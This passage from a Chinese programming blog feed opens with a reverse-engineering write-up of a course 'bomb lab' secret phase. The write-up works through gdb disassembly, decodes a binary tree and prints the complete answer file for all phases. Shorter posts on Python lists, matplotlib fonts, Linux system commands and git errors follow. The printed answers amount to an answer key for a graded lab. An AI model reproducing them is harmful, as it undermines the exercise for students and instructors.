思路</h2><ol><li><p>进入 secret_phase：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble secret_phase</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> secret_phase:</span><br><span class="line">   0x00401a98 &lt;+0&gt;:     endbr32</span><br><span class="line">   0x00401a9c &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x00401a9d &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x00401a9f &lt;+7&gt;:     push   esi</span><br><span class="line">   0x00401aa0 &lt;+8&gt;:     push   ebx</span><br><span class="line">   0x00401aa1 &lt;+9&gt;:     call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00401aa6 &lt;+14&gt;:    add    ebx,0x34be</span><br><span class="line">   0x00401aac &lt;+20&gt;:    call   0x401f09 &lt;read_line&gt;</span><br><span class="line">   0x00401ab1 &lt;+25&gt;:    sub    esp,0x4</span><br><span class="line">   0x00401ab4 &lt;+28&gt;:    push   0xa</span><br><span class="line">   0x00401ab6 &lt;+30&gt;:    push   0x0</span><br><span class="line">   0x00401ab8 &lt;+32&gt;:    push   eax</span><br><span class="line">   0x00401ab9 &lt;+33&gt;:    call   0x401340 &lt;strtol@plt&gt;</span><br><span class="line">   0x00401abe &lt;+38&gt;:    mov    esi,eax</span><br><span class="line">   0x00401ac0 &lt;+40&gt;:    lea    eax,[eax-0x1]</span><br><span class="line">   0x00401ac3 &lt;+43&gt;:    add    esp,0x10</span><br><span class="line">   0x00401ac6 &lt;+46&gt;:    cmp    eax,0x3e8</span><br><span class="line">   0x00401acb &lt;+51&gt;:    ja     0x401b03 &lt;secret_phase+107&gt;</span><br><span class="line">   0x00401acd &lt;+53&gt;:    sub    esp,0x8</span><br><span class="line">   0x00401ad0 &lt;+56&gt;:    push   esi</span><br><span class="line">   0x00401ad1 &lt;+57&gt;:    lea    eax,[ebx+0x540]</span><br><span class="line">   0x00401ad7 &lt;+63&gt;:    push   eax</span><br><span class="line">   0x00401ad8 &lt;+64&gt;:    call   0x401a42 &lt;fun7&gt;</span><br><span class="line">   0x00401add &lt;+69&gt;:    add    esp,0x10</span><br><span class="line">   0x00401ae0 &lt;+72&gt;:    cmp    eax,0x3</span><br><span class="line">   0x00401ae3 &lt;+75&gt;:    jne    0x401b0a &lt;secret_phase+114&gt;</span><br><span class="line">   0x00401ae5 &lt;+77&gt;:    sub    esp,0xc</span><br><span class="line">   0x00401ae8 &lt;+80&gt;:    lea    eax,[ebx-0x1df4]</span><br><span class="line">   0x00401aee &lt;+86&gt;:    push   eax</span><br><span class="line">   0x00401aef &lt;+87&gt;:    call   0x401280 &lt;puts@plt&gt;</span><br><span class="line">   0x00401af4 &lt;+92&gt;:    call   0x40203c &lt;phase_defused&gt;</span><br><span class="line">   0x00401af9 &lt;+97&gt;:    add    esp,0x10</span><br><span class="line">   0x00401afc &lt;+100&gt;:   lea    esp,[ebp-0x8]</span><br><span class="line">   0x00401aff &lt;+103&gt;:   pop    ebx</span><br><span class="line">   0x00401b00 &lt;+104&gt;:   pop    esi</span><br><span class="line">   0x00401b01 &lt;+105&gt;:   pop    ebp</span><br><span class="line">   0x00401b02 &lt;+106&gt;:   ret</span><br><span class="line">   0x00401b03 &lt;+107&gt;:   call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x00401b08 &lt;+112&gt;:   jmp    0x401acd &lt;secret_phase+53&gt;</span><br><span class="line">   0x00401b0a &lt;+114&gt;:   call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x00401b0f &lt;+119&gt;:   jmp    0x401ae5 &lt;secret_phase+77&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可以看到<code>&lt;+20&gt;</code>调用了read_line函数，接着把read_line的返回值赋给了eax，并调用了strtol函数，这个标准库函数的作用是把一个字符串转换成对应的长整型数值。返回值还是存放在eax中，<code>&lt;+38&gt;</code>将eax赋值给了esi，<code>&lt;+40&gt;</code>将eax减1赋给eax，<code>&lt;+46&gt;</code>与1000(0x3e8)进行比较，如果这个值小于等于0x3e8就跳过引爆代码。看到这里可以知道我们需要再加入一行数据，它应该是一个小于等于1001的数值。</p></li><li><p><code>&lt;+53&gt;</code>将 esi 赋给了 M[esp + 4] ，也就是一开始输入的 eax 值。<code>&lt;+57&gt;</code>将ebx+0x540赋给了 M[esp] ，<code>&lt;+64&gt;</code>调用了 fun7 函数。函数返回后令返回值 eax 与 0x3 做了一个比较，如果相等则跳过引爆代码。所以fun7函数需要返回3；</p></li><li><p>查看 fun7 函数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble fun7</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> fun7:</span><br><span class="line">   0x00401a42 &lt;+0&gt;:     endbr32</span><br><span class="line">   0x00401a46 &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x00401a47 &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x00401a49 &lt;+7&gt;:     push   ebx</span><br><span class="line">   0x00401a4a &lt;+8&gt;:     sub    esp,0x4</span><br><span class="line">   0x00401a4d &lt;+11&gt;:    mov    edx,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x00401a50 &lt;+14&gt;:    mov    ecx,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x00401a53 &lt;+17&gt;:    <span class="built_in">test</span>   edx,edx</span><br><span class="line">   0x00401a55 &lt;+19&gt;:    je     0x401a91 &lt;fun7+79&gt;</span><br><span class="line">   0x00401a57 &lt;+21&gt;:    mov    ebx,DWORD PTR [edx]</span><br><span class="line">   0x00401a59 &lt;+23&gt;:    cmp    ebx,ecx</span><br><span class="line">   0x00401a5b &lt;+25&gt;:    jg     0x401a69 &lt;fun7+39&gt;</span><br><span class="line">   0x00401a5d &lt;+27&gt;:    mov    eax,0x0</span><br><span class="line">   0x00401a62 &lt;+32&gt;:    jne    0x401a7c &lt;fun7+58&gt;</span><br><span class="line">   0x00401a64 &lt;+34&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x00401a67 &lt;+37&gt;:    leave</span><br><span class="line">   0x00401a68 &lt;+38&gt;:    ret</span><br><span class="line">   0x00401a69 &lt;+39&gt;:    sub    esp,0x8</span><br><span class="line">   0x00401a6c &lt;+42&gt;:    push   ecx</span><br><span class="line">   0x00401a6d &lt;+43&gt;:    push   DWORD PTR [edx+0x4]</span><br><span class="line">   0x00401a70 &lt;+46&gt;:    call   0x401a42 &lt;fun7&gt;</span><br><span class="line">   0x00401a75 &lt;+51&gt;:    add    esp,0x10</span><br><span class="line">   0x00401a78 &lt;+54&gt;:    add    eax,eax</span><br><span class="line">   0x00401a7a &lt;+56&gt;:    jmp    0x401a64 &lt;fun7+34&gt;</span><br><span class="line">   0x00401a7c &lt;+58&gt;:    sub    esp,0x8</span><br><span class="line">   0x00401a7f &lt;+61&gt;:    push   ecx</span><br><span class="line">   0x00401a80 &lt;+62&gt;:    push   DWORD PTR [edx+0x8]</span><br><span class="line">   0x00401a83 &lt;+65&gt;:    call   0x401a42 &lt;fun7&gt;</span><br><span class="line">   0x00401a88 &lt;+70&gt;:    add    esp,0x10</span><br><span class="line">   0x00401a8b &lt;+73&gt;:    lea    eax,[eax+eax*1+0x1]</span><br><span class="line">   0x00401a8f &lt;+77&gt;:    jmp    0x401a64 &lt;fun7+34&gt;</span><br><span class="line">   0x00401a91 &lt;+79&gt;:    mov    eax,0xffffffff</span><br><span class="line">   0x00401a96 &lt;+84&gt;:    jmp    0x401a64 &lt;fun7+34&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>查看一下 M[esp] 这个地址里存放的什么数据结构：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x00401ad8  <span class="comment">#打断点至&lt;+64&gt;</span></span><br><span class="line">gdb-peda$ x/24xw <span class="variable">$eax</span></span><br><span class="line">0x4054a4 &lt;n1&gt;:  0x00000024      0x004054b0      0x004054bc      0x00000008</span><br><span class="line">0x4054b4 &lt;n21+4&gt;:       0x004054e0      0x004054c8      0x00000032      0x004054d4</span><br><span class="line">0x4054c4 &lt;n22+8&gt;:       0x004054ec      0x00000016      0x0040505c      0x00405044</span><br><span class="line">0x4054d4 &lt;n33&gt;: 0x0000002d      0x00405020      0x00405068      0x00000006</span><br><span class="line">0x4054e4 &lt;n31+4&gt;:       0x0040502c      0x00405050      0x0000006b      0x00405038</span><br><span class="line">0x4054f4 &lt;n34+8&gt;:       0x00405074      0x000002a0      0x00000001      0x00000000</span><br></pre></td></tr></table></figure><p>仔细观察可以发现这是一个二叉树的结构，每个节点第1个4字节存放数据，第2个4字节存放左子树地址，第3个4字节存放右子树位置。并且命名也有规律，<code>nab</code>，<code>a</code> 代表层数，<code>b</code> 代表从左至右第b个节点。整理可得：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x4054a4 &lt;n1&gt;:  0x00000024      0x004054b0      0x004054bc</span><br><span class="line">0x4054b0 &lt;n21&gt;: 0x00000008      0x004054e0      0x004054c8</span><br><span class="line">0x4054bc &lt;n22&gt;: 0x00000032      0x004054d4      0x004054ec</span><br><span class="line">0x4054e0 &lt;n31&gt;: 0x00000006      0x0040502c      0x00405050</span><br><span class="line">0x4054c8 &lt;n32&gt;: 0x00000016      0x0040505c      0x00405044</span><br><span class="line">0x4054d4 &lt;n33&gt;: 0x0000002d      0x00405020      0x00405068</span><br><span class="line">0x4054ec &lt;n34&gt;: 0x0000006b      0x00405038      0x00405074</span><br><span class="line">0x40502c &lt;n41&gt;: 0x00000001      0x00000000      0x00000000</span><br><span class="line">0x405050 &lt;n42&gt;: 0x00000007      0x00000000      0x00000000</span><br><span class="line">0x40505c &lt;n43&gt;: 0x00000014      0x00000000      0x00000000</span><br><span class="line">0x405044 &lt;n44&gt;: 0x00000023      0x00000000      0x00000000</span><br><span class="line">0x405020 &lt;n45&gt;: 0x00000028      0x00000000      0x00000000</span><br><span class="line">0x405068 &lt;n46&gt;: 0x0000002f      0x00000000      0x00000000</span><br><span class="line">0x405038 &lt;n47&gt;: 0x00000063      0x00000000      0x00000000</span><br><span class="line">0x405074 &lt;n48&gt;: 0x000003e9      0x00000000      0x00000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">graph TB</span><br><span class="line">  0x24 --&gt; 0x08</span><br><span class="line">  0x24 --&gt; 0x32</span><br><span class="line">  0x08 --&gt; 0x06</span><br><span class="line">  0x08 --&gt; 0x16</span><br><span class="line">  0x32 --&gt; 0x2d</span><br><span class="line">  0x32 --&gt; 0x6b</span><br><span class="line">  0x06 --&gt; 0x01</span><br><span class="line">  0x06 --&gt; 0x07</span><br><span class="line">  0x2d --&gt; 0x28</span><br><span class="line">  0x2d --&gt; 0x2f</span><br><span class="line">  0x6b --&gt; 0x63</span><br><span class="line">  0x6b --&gt; 0x3e9</span><br><span class="line">  0x16 --&gt; 0x14</span><br><span class="line">  0x16 --&gt; 0x23</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/05/26/3jUNCrcuDWAf5Ms.png" width="600" height="300" alt="图片名称" align="center" id="201"></li><li><p>总结上面的过程： M[esp] 指向树的一个节点，令节点的值与读入的值进行比较。</p><ul><li>如果前者大于后者： M[esp] 移至左子树，返回 2 * eax ；</li><li>如果前者不等于后者： M[esp] 移至右子树，返回 2 * eax + 1 ；</li><li>如果前者等于后者：返回0</li></ul></li><li><p>那么我们需要返回3，根据递归可得当输入是 0x63（99）时返回3。</p></li></ol><p><strong>答案</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99</span><br></pre></td></tr></table></figure><h1 id="9-最终答案"><a class="markdownIt-Anchor" href="#9-最终答案"></a> 9 最终答案</h1><p><code>flag.txt</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">And they have no disregard <span class="keyword">for</span> human life.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 1071 </span><br><span class="line">24 2 DrEvil</span><br><span class="line">111100</span><br><span class="line">4 6 5 3 2 1</span><br><span class="line">99</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./bomb flag.txt</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That<span class="string">'s number 2.  Keep going!</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string">So you got that one.  Try this one.</span></span><br><span class="line"><span class="string">Good work!  On to the next...</span></span><br><span class="line"><span class="string">Curses, you'</span>ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br><span class="line">Wow! You<span class="string">'ve defused the secret stage!</span></span><br><span class="line"><span class="string">Congratulations! You'</span>ve defused the bomb!</span><br><span class="line">Your instructor has been notified and will verify your solution.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表-生成列表</title>
      <link href="/2022/05/12/Python-%E5%88%97%E8%A1%A8-%E7%94%9F%E6%88%90%E5%88%97%E8%A1%A8/"/>
      <url>/2022/05/12/Python-%E5%88%97%E8%A1%A8-%E7%94%9F%E6%88%90%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p>需求：生成1-10的列表；生成10个0的列表</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># list方法</span></span><br><span class="line">init_list = list(range(<span class="number">1</span>, <span class="number">10</span>+<span class="number">1</span>))  <span class="comment"># [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># []方法</span></span><br><span class="line">init_list = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>+<span class="number">1</span>)]  <span class="comment"># [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环方法</span></span><br><span class="line">init_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>+<span class="number">1</span>):</span><br><span class="line">    init_list.append(i)</span><br><span class="line">print(init_list)  <span class="comment"># [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乘法</span></span><br><span class="line">init_list = [<span class="number">0</span>] * <span class="number">10</span>  <span class="comment"># [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/QQ18180564/article/details/105839040" target="_blank" rel="noopener">python------用多种方法生成1到100的列表并打印</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib画图出现中文乱码</title>
      <link href="/2022/05/12/matplotlib%E7%94%BB%E5%9B%BE%E5%87%BA%E7%8E%B0%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/"/>
      <url>/2022/05/12/matplotlib%E7%94%BB%E5%9B%BE%E5%87%BA%E7%8E%B0%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题描述"><a class="markdownIt-Anchor" href="#1-问题描述"></a> 1 问题描述</h1><p>使用matplotlib画图，其中x和y轴标题中出现中文乱码。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>在代码前面加入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pylab <span class="keyword">import</span> *</span><br><span class="line">mpl.rcParams[<span class="string">'font.sans-serif'</span>] = [<span class="string">'SimHei'</span>]</span><br><span class="line">mpl.rcParams[<span class="string">'axes.unicode_minus'</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure><h1 id="3-参考"><a class="markdownIt-Anchor" href="#3-参考"></a> 3 参考</h1><ul><li><a href="https://blog.csdn.net/xjh163/article/details/101076551" target="_blank" rel="noopener">python中画图显示中文乱码</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux查看系统信息</title>
      <link href="/2022/05/11/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"/>
      <url>/2022/05/11/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-系统版本"><a class="markdownIt-Anchor" href="#1-系统版本"></a> 1 系统版本</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(base) [ccyin@localhost ~]$ cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 7.6.1810 (Core)</span><br></pre></td></tr></table></figure><p><a href="https://jingyan.baidu.com/article/425e69e6ada3edff14fc167c.html" target="_blank" rel="noopener">Linux怎么查看操作系统版本号</a></p><h1 id="2-显卡"><a class="markdownIt-Anchor" href="#2-显卡"></a> 2 显卡</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvidia-smi</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/dcrmg/article/details/78146797" target="_blank" rel="noopener">Linux查看GPU信息和使用情况</a></p><h1 id="3-cpu"><a class="markdownIt-Anchor" href="#3-cpu"></a> 3 CPU</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat  /proc/cpuinfo</span><br></pre></td></tr></table></figure><p><a href="https://www.yisu.com/zixun/132704.html" target="_blank" rel="noopener">linux查看cpu型号的方法</a></p><h1 id="4-内存"><a class="markdownIt-Anchor" href="#4-内存"></a> 4 内存</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(base) [ccyin@localhost ~]$ cat /proc/meminfo</span><br><span class="line">MemTotal:       263591864 kB</span><br><span class="line">MemFree:        191960176 kB</span><br><span class="line">MemAvailable:   246338560 kB</span><br><span class="line">Buffers:          119332 kB</span><br><span class="line">Cached:         53866512 kB</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">(base) [ccyin@localhost ~]$ free -m</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:         257413       15579      187461          27       54372      240565</span><br><span class="line">Swap:          4095           0        4095</span><br></pre></td></tr></table></figure><p><a href="https://www.programminghunter.com/article/9454887470/" target="_blank" rel="noopener">linux 查看CPU、内存大小</a></p><h1 id="5-硬盘"><a class="markdownIt-Anchor" href="#5-硬盘"></a> 5 硬盘</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(base) [ccyin@localhost ~]$ df -h</span><br><span class="line">文件系统                 容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/centos-root   50G   16G   35G   31% /</span><br><span class="line">devtmpfs                 126G     0  126G    0% /dev</span><br><span class="line">tmpfs                    126G  8.0K  126G    1% /dev/shm</span><br><span class="line">tmpfs                    126G   12M  126G    1% /run</span><br><span class="line">tmpfs                    126G     0  126G    0% /sys/fs/cgroup</span><br><span class="line">/dev/sda2               1014M  182M  833M   18% /boot</span><br><span class="line">/dev/mapper/centos-home  2.2T  1.5T  724G   67% /home</span><br><span class="line">tmpfs                     26G   12K   26G    1% /run/user/42</span><br><span class="line">tmpfs                     26G     0   26G    0% /run/user/1005</span><br><span class="line">tmpfs                     26G     0   26G    0% /run/user/1003</span><br><span class="line">tmpfs                     26G     0   26G    0% /run/user/1002</span><br><span class="line">tmpfs                     26G     0   26G    0% /run/user/1010</span><br><span class="line">/dev/mapper/data1-lvol0  8.0T  4.1G  7.6T    1% /data1</span><br></pre></td></tr></table></figure><p><a href="https://www.programminghunter.com/article/9454887470/" target="_blank" rel="noopener">linux 查看CPU、内存大小</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git报错之error: object file .git/objects/31/65329bb680e30595f242b7c4d8406ca63eeab0 is empty</title>
      <link href="/2022/05/11/git%E6%8A%A5%E9%94%99%E4%B9%8Berror-object-file-git-objects-31-65329bb680e30595f242b7c4d8406ca63eeab0-is-empty/"/>
      <url>/2022/05/11/git%E6%8A%A5%E9%94%99%E4%B9%8Berror-object-file-git-objects-31-65329bb680e30595f242b7c4d8406ca63eeab0-is-empty/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error: object file .git/objects/31/65329bb680e30595f242b7c4d8406ca63eeab0 is empty</span><br><span class="line">fatal: loose object 3165329bb680e30595f242b7c4d8406ca63eeab0 (stored <span class="keyword">in</span> .git/objects/31/65329bb680e30595f242b7c4d8406ca63eeab0) is corrupt</span><br></pre></td></tr></table></figure><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h1 id="3-参考"><a class="markdownIt-Anchor" href="#3-参考"></a> 3 参考</h1><ul><li><a href="https://segmentfault.com/a/1190000008734662" target="_blank" rel="noopener">git错误：对象文件为空（object-file-is-empty）解决方案</a></li><li><a href="https://stackoverflow.com/questions/11706215/how-can-i-fix-the-git-error-object-file-is-empty" target="_blank" rel="noopener">How can I fix the Git error “object file … is empty”?</a></li><li><a href="https://localcoder.org/git-status-shows-fatal-bad-object-head" target="_blank" rel="noopener">git status shows fatal: bad object HEAD</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git报错之error: refs/heads/pa2 does not point to a valid object</title>
      <link href="/2022/05/10/git%E6%8A%A5%E9%94%99%E4%B9%8Berror-refs-heads-pa2-does-not-point-to-a-valid-object/"/>
      <url>/2022/05/10/git%E6%8A%A5%E9%94%99%E4%B9%8Berror-refs-heads-pa2-does-not-point-to-a-valid-object/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>目前项目有两个分支：pa1和pa2。pa1分支没有更新到云端，需要更新；pa2分支出现问题。</p><p><strong>目标</strong>：删除pa2分支，将pa1 push到云端。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><ol><li><p>切换到pa1分支，<code>git checkout pa1</code></p><img src="https://s2.loli.net/2022/05/10/FZmLMNhPlxiUCd1.png" width="550" height="300" alt="图片名称" align="center" id="199"></li><li><p>提交本地pa2修改的代码，出现如下报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .</span><br><span class="line">$ git commit</span><br><span class="line">fatal: could not parse HEAD</span><br></pre></td></tr></table></figure></li><li><p>强制切换pa1分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -f pa1</span><br></pre></td></tr></table></figure></li><li><p>将pa1分支push到云端，出现报错：</p><img src="https://s2.loli.net/2022/05/10/iNlGDgz2kVKxjoW.png" width="650" height="100" alt="图片名称" align="center" 